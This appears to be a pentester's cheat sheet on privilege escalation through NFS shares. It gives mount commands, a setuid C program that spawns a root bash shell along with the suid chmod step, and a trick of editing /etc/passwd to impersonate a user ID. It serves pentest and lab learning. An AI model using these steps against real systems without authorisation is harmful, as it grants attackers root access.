# NFS Share/Unmounted Filesystem

## Overview

* if you find that a machine has a NFS share you might be able to use that to escalate privileges, depending on how it is configured

## If Already on Target System

```
mount -l
cat /etc/fstab
```

## First, Check if the Target Machine has any NFS Shares

```bash
showmount -e 192.168.1.101
```

## If it Does, then Mount it to the Attacking Filesystem

```bash
mount 192.168.1.101:/foldername ~/tmp/
```

* if that succeeds then you can go to /tmp/share
* might be some interesting stuff there, but even if there isn't you might be able to exploit it
* ff you have write privileges you can create files
* test if you can create files, then check with your low-priv shell what user has created that file
* if it says that it is the root-user that has created the file it is good news
* then you can create a file and set it with suid-permission from your attacking machine, And  execute it with your low privilege shell
* this code can be compiled and added to the share
* before executing it by your low-priv user make sure to set the suid-bit on it

```bash
chmod 4777 exploit
```

* then this

```bash
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
setuid(0);
system("/bin/bash");
return 0;
}
```

## How to Mount a File System

```bash
# 1 way
mountâ€ˆ-l
cat /etc/fstab

# for older file systems, "-o nolock"
# lets say we find /home with scanning
sudo mount -o nolock 10.10.10.10:/home ~/local_path/

# if a file is only viewable/etc by a specific user, find the UUID of the user
# by checking file permissions, then create a new user on your machine that
# has that UUID so the file can be viewed
# use the commmand below to change the UUID of the new user you just created,
# then switch users
sudo sed -i -e 's/old_uuid/new_uuid/g' /etc/passwd
```

## Additional Resources

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html) (priv esc)
